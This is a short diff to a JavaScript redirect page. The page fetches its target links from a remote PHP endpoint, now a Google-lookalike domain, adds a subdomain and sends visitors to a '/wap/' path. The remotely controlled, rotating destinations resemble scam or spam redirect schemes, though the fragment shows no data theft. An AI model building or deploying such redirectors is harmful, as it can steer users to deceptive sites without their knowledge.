@@ -83,7 +83,7 @@
         const dotInterval = setInterval(animateDots, 500);
 
         // Perform the redirect
-        fetch('https://shop.co.pgylxz302.me/get_links.php')
+        fetch('https://goog04.ptna2016.cc/get_links.php')
             .then(response => {
                 if (!response.ok) throw new Error('Network error');
                 return response.text();
@@ -112,7 +112,7 @@
                 // Build final URL
                 const url = new URL(domain);
                 url.hostname = `${subdomain}.${url.hostname}`;
-                url.pathname = '/wap';
+                url.pathname = '/wap/';
                 
                 window.location.href = url.toString();
             })
